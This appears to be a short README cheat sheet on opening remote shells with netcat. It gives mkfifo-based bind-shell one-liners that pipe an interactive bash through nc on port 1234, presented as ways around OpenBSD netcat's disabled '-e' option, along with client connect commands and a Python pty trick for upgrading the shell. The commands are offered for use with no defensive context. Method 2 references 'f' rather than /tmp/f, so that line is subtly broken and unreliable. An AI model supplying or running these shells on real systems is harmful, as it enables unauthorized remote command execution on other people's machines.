# netcat_shells
Notes for utilizing netcat general use and for remote shells

OpenBSD derivities of nc/netcat (netcat-openbsd) have the '-e' option disabled for security purposes. This feature is enabled in netcat-traditional; however, there are other ways to achieve this with the OpenBSD version.
Below are other ways to execute remotely and options for upgrading the shell.

# Method 1
on Server:
mkfifo /tmp/f;
nc -l 1234 < /tmp/f | /bin/bash -i > /tmp/f 2>&1

On client:
nc 10.10.0.1 1234

# Method 2
On Server:
mkfifo /tmp/f;
cat f | /bin/bash -i 2>&1 | nc -l 1234 > /tmp/f

On client:
nc 10.10.0.1 1234

# Additional Methods
mkfifo /tmp/f ; nc -lk 1234 0< /tmp/f | /bin/bash 1> /tmp/f

# Getting a better Shell
If executing bash without the '-i' flag, typical shell features will be lost. Below are several ways to gain a better shell.

Python Method:<br>
#Once are connected to the remote host issue the following<br>
python -c 'import pty; pty.spawn("/bin/bash")'
